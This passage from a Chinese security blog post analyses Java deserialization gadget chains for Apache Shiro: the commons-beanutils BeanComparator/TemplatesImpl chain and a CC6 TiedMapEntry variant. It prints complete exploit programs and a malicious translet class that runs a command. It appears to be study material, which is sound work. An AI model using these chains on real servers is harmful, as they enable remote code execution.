+<li><p>私有成员变量：<br> JavaBean 的成员变量应该是私有的，以确保封装。</p>
+</li>
+<li><p>属性的 getter 和 setter 方法：<br> 每个成员变量都应该有一个对应的 getter 和 setter 方法。<br> getter 方法通常命名为 get&lt;PropertyName&gt;，setter 方法通常命名为 set&lt;PropertyName&gt;。<br> 示例：<code>public String getName() &#123; return name; &#125;</code></p>
+</li>
+</ol>
+<p>  <code>public void setName(String name) &#123; this.name = name; &#125;</code></p>
+<ol start="5">
+<li><p>序列化：<br> JavaBean 通常需要实现 Serializable 接口，以便能够将 JavaBean 对象的状态保存到文件中或在网络上传输。</p>
+</li>
+<li><p>命名约定：<br> 属性名应符合 Java 的命名规则，通常使用驼峰式命名法。<br> 如果属性名以 “is” 开头，则 getter 方法可以省略 “get” 前缀，直接使用 is&lt;PropertyName&gt;。<br> 示例：public boolean isMarried() { return married; }</p>
+</li>
+</ol>
+</blockquote>
+<p>getProperty传入的必须是个javabean，属性要有对应的getter，setter。实际上getProperty就是调用了属性的getter方法。</p>
+<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>链式调用到PropertyUtilsBean.getNestedProperty：</p>
+<p>bean不是Map子类，且查询的name不是map和索引时，会调用到getSimpleProperty（包不是的）</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806171105817.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806171105817.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>getSimpleProperty中，获取了对应的getter方法，并反射调用。</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806172225153.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806172225153.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>而且前面根本没有判断！也就是说不管你getter对应的name是否存在，类是否符合javaBean的规范一概不判断，只要有符合getter命名规范的方法，getReadMethod就能找到方法，就能进行调用。</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>既然能调用除Map子类外任意类符合getter命名的方法。TemplatesImpl下的getOutputProperties就非常符合条件了。顺利调用到newTransformer()</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806173137478.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806173137478.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>我们在攻击环境加上如下依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>触发getOutputProperties代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\RuntimeEvil.class&quot;</span>));</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">    <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">            field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">            field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">            field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    PropertyUtils.getProperty(templatesClass, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那怎么调用getProperty呢？</p>
+<p>我们找到了一个类似TransformingComparator.compare的触发点，在BeanComparator.compare。</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806174420332.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806174420332.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>property用构造函数传入</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806175442174.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806175442174.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>依旧用PriorityQueue.siftDownUsingComparator链上，后面就和CC2一样了。</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806175123345.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806175123345.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>完整代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroAttackCB</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\RuntimeEvil.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">1</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>)));</span><br><span class="line">        priorityQueue.add(templatesClass);</span><br><span class="line">        priorityQueue.add(templatesClass);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">compareField</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        compareField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        compareField.set(priorityQueue,beanComparator);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;cc6.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806175759529.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806175759529.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h2 id="CC链"><a href="#CC链" class="headerlink" title="CC链"></a>CC链</h2><p>就算服务器有CC依赖（可能是业务开发需要），我们也需要进行修改才能利用。</p>
+<blockquote>
+<p>shiro<strong>如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误</strong></p>
+<p>原理见<a target="_blank" rel="noopener" href="https://daidaitiehanhan.github.io/2022/04/26/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E4%B8%83)-%E5%85%B3%E4%BA%8EShiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%97%A0%E6%B3%95%E6%89%A7%E8%A1%8Cyso%E4%B8%ADCC%E9%93%BE%E8%BF%99%E4%BB%B6%E4%BA%8B/">https://daidaitiehanhan.github.io/2022/04/26/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E4%B8%83)-%E5%85%B3%E4%BA%8EShiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%97%A0%E6%B3%95%E6%89%A7%E8%A1%8Cyso%E4%B8%ADCC%E9%93%BE%E8%BF%99%E4%BB%B6%E4%BA%8B/</a></p>
+<p><a target="_blank" rel="noopener" href="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802170805620.png"></a></p>
+</blockquote>
+<p>我们在shiro项目web.xml中手动加上CC3.2.1的依赖：</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806164207492.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806164207492.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>3.2.1版本，就不能用TransformingComparator，不用Transformer数组，就是不用chainedTransformer。也就是不能反射调用Runtime，只能选择加载字节码。</p>
+<p>那就是想办法触发：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="comment">//构造恶意字节码</span></span><br><span class="line">templatesClass.newTransformer()</span><br></pre></td></tr></table></figure>
+
+<p>等于触发：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">invokerTransformer.transform(templatesClass)</span><br></pre></td></tr></table></figure>
+
+<p>困难点就在于以前我们都是chainedTransformer链式调用transform，起始的transform参数都是用ConstantTransformer传的，自己很难控制。</p>
+<p>我们梳理一下CC6的调用链</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6TiedMapEntry</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;godown&quot;</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;test1&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;test2&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">lazymapClass</span> <span class="operator">=</span> lazyMap.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> lazymapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(factory, factory.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">        factory.set(lazyMap, chainedTransformer);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line"><span class="comment">//        unserialize(&quot;cc6.ser&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()-&gt;hash()-&gt;</span><br><span class="line">    TiedMapEntry.hashCode()-&gt;getValue()-&gt;</span><br><span class="line">    	LazyMap.get()-&gt;</span><br><span class="line">    		chainedTransformer.transform()</span><br></pre></td></tr></table></figure>
+
+<p>在HashMap.put添加TiedMapEntry时，触发了hash()，所以先LazyMap绑定的常量ConstantTransformer。</p>
+<p>而且hashMap.put时，调用至TiedMapEntry.getValue()-&gt;LazyMap.get，把TiedMapEntry当前的key和transform的结果put进map了，也就是test1。第二次就不会进if，所以payload remove了该键。</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806144728449.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806144728449.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806144522352.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806144522352.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>注意到没有，这里transform的参数就是我们new TiedMapEntry时传入的参数test1。现在我们传templatesClass，分别在put时触发一次，反序列化时触发一次。</p>
+<p>所以transform的参数是可以控制的。</p>
+<p>知道这一点就很简单了，我们直接构造以下链：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()-&gt;hash()-&gt;</span><br><span class="line">    TiedMapEntry.hashCode()-&gt;getValue()-&gt;</span><br><span class="line">    	LazyMap.get()-&gt;</span><br><span class="line">    		InvokerTransformer.transform()-&gt;</span><br><span class="line">    			TemplatesImpl.newTransformer()</span><br></pre></td></tr></table></figure>
+
+<p>构造一个RuntimeEvil恶意字节码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeEvil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RuntimeEvil</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>生成CC6字节码：</p>
